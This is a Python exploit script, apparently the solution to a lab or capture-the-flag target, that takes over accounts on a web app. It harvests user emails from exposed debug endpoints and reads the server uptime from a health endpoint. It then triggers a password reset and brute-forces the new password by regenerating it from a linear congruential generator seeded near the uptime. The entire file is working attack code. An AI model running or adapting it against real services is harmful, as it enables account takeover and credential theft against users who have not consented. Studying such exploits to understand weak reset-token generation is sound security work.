import sys
import requests
import json
import argparse

# ASCII banner
banner = """
██╗  ██╗███╗   ██╗ ██████╗ ██████╗  ██╗
██║  ██║████╗  ██║██╔════╝ ╚════██╗███║
███████║██╔██╗ ██║███████╗  █████╔╝╚██║
╚════██║██║╚██╗██║██╔═══██╗ ╚═══██╗ ██║
     ██║██║ ╚████║╚██████╔╝██████╔╝ ██║
     ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝  ╚═╝ 
"""

# ANSI escape codes for colors
GREEN = "\033[92m"
RED = "\033[91m"
BLUE = "\033[34m"
CYAN = "\033[96m"
RESET = "\033[0m"

# Fetch user data
def getUser(api_url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36'
    }
    try:
        response = requests.get(api_url, headers=headers)
        if response.status_code == 200:
            return response.json()
        else:
            print(RED + "[!] Error: Unable to fetch user data. Status code:" + RESET, response.status_code)
            return None
    except requests.RequestException as e:
        print(RED + "[!] Error: Request failed:" + RESET, e)
        return None

# Fetch disabled user data
def getDisabledUsers(api_url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36'
    }
    try:
        response = requests.get(api_url, headers=headers)
        if response.status_code == 200:
            return response.json()  # Return the JSON response directly
        else:
            print(RED + "[!] Error: Unable to fetch disabled user data. Status code:" + RESET, response.status_code)
            return None
    except requests.RequestException as e:
        print(RED + "[!] Error: Request failed:" + RESET, e)
        return None

# Password recovery process for the specified email
def recover(email, api_url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36',
        'Content-Type': 'application/json'
    }
    data = {
        'email': email
    }
    try:
        response = requests.post(api_url, headers=headers, data=json.dumps(data))
        if response.status_code == 200:
            print(GREEN + "[+] Recovery request successful!" + RESET)
            print() # Seperator
        else:
            print(RED + "[!] Error: Unable to initiate recovery process. Status code:" + RESET, response.status_code)
    except requests.RequestException as e:
        print(RED + "[!] Error: Request failed:" + RESET, e)

# Fetch system uptime from the health API
def get_uptime(ip):
    url = f"http://{ip}/api/health"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36",
        "Accept-Encoding": "gzip, deflate, br"
    }
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            data = response.json()
            uptime = data.get("uptime", None)
            if uptime is not None:
                return uptime
    except requests.RequestException as e:
        print(RED + "[!] Error: Request failed:" + RESET, e)
    return None

# Create a linear congruential generator (LCG) using the specified seed
def create_lcg(seed):
    m = 2 ** 32
    a = 1664525
    c = 1013904223
    value = seed
    while True:
        value = (a * value + c) % m
        yield value / m

# Generate a random password using LCG with the given seed
def generate_random_password(seed):
    length = 12
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=<>?|"
    password = ""
    random_gen = create_lcg(seed)
    for _ in range(length):
        random_index = int(next(random_gen) * len(charset))
        password += charset[random_index]
    return password

# Generate a range of passwords based on the seed and range size
def generate_passwords_in_range(seed, range_size):
    passwords = []
    for i in range(seed - range_size, seed + range_size + 1):
        passwords.append(generate_random_password(i))
    return passwords

# Try login using generated passwords for the given username
def try_passwords(passwords, username, ip):
    url = f"http://{ip}/api/authenticate"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36",
        "Content-Type": "application/json"
    }
    data = {"email": username, "password": ""}
    for password in passwords:
        data["password"] = password
        response = requests.post(url, headers=headers, data=json.dumps(data))
        if response.status_code == 200:  # Assuming 200 means successful login
            print(GREEN + "[+] Logged in successfully!" + RESET)
            print() # Seperator
            print(BLUE + "[*] Username:" + RESET, username)
            print(BLUE + "[*] Password:" + RESET, password)
            break
    else:
        print(RED + "[!] No successful password found." + RESET)

def execute_workflow(ip, print_banner):
    if print_banner:
        print(banner)
    print(CYAN + "[*] Exploit initiated!" + RESET)
    print() # Seperator
    # Fetch user data
    user_data = getUser(f"http://{ip}/api/debug/users")
    if user_data:
        # Fetch disabled users
        disabled_users = getDisabledUsers(f"http://{ip}/api/debug/users/disabled")
        if disabled_users is None:
            disabled_users = []
        
        disabled_emails = disabled_users if isinstance(disabled_users, list) else []

        # Display user details with status
        print("\t\t*** User Details ***")
        print("-" * 60)  # Line of hyphens as a separator
        print("Index\tName\t\tEmail\t\t\tStatus")
        for index, user in enumerate(user_data):
            status = "\tDisabled" if user['email'] in disabled_emails else "Enabled"
            print(f"{index + 1}\t{user['name']}\t{user['email']}\t{status}")
        print("-" * 60)  # Line of hyphens as a separator

        # Prompt user to input email for recovery
        print() # Seperator
        user_choice = int(input("Enter the index of the user to recover password for: "))
        if 1 <= user_choice <= len(user_data):
            email = user_data[user_choice - 1].get("email")
            if email:
                print() # Seperator
                print(CYAN + "[*] User email selected for recovery:" + RESET, email)
                print() # Seperator
                # Check if the user is disabled
                disabled_users = getDisabledUsers(f"http://{ip}/api/debug/users/disabled")
                if disabled_users and email in disabled_users:
                    print(RED + "[!] The selected user is disabled. Password recovery not possible." + RESET)
                    return
                # Get uptime
                uptime = get_uptime(ip)
                if uptime is not None:
                    print(CYAN + "[*] Uptime:" + RESET, uptime)
                    print() # Seperator
                    # Attempt recovery
                    recover(email, f"http://{ip}/api/recover")
                    # Generate passwords
                    print(CYAN + "[*] Generating passwords...." + RESET)
                    print() # Seperator
                    initial_seed = int(uptime)
                    range_size = 3
                    passwords = generate_passwords_in_range(initial_seed, range_size)
                    # Try passwords
                    print(CYAN + "[*] Trying login...." + RESET)
                    print() # Seperator
                    try_passwords(passwords, email, ip)
                else:
                    print(RED + "[!] Failed to retrieve uptime." + RESET)
            else:
                print(RED + "[!] Email not found for selected user." + RESET)
        else:
            print(RED + "[!] Invalid choice." + RESET)
    else:
        print(RED + "[!] Failed to fetch user data." + RESET)

# Argument Parser
parser = argparse.ArgumentParser(prog="exploit.py", description="A Python3 script to exploit a sample site to perform an account takeover.")
parser.add_argument("ip", help="IP address of the target like 10.x.50.x")
parser.add_argument("--no-banner", action="store_true", help="Do not print the banner")
args = parser.parse_args()

# Running the exploit
execute_workflow(args.ip, not args.no_banner)
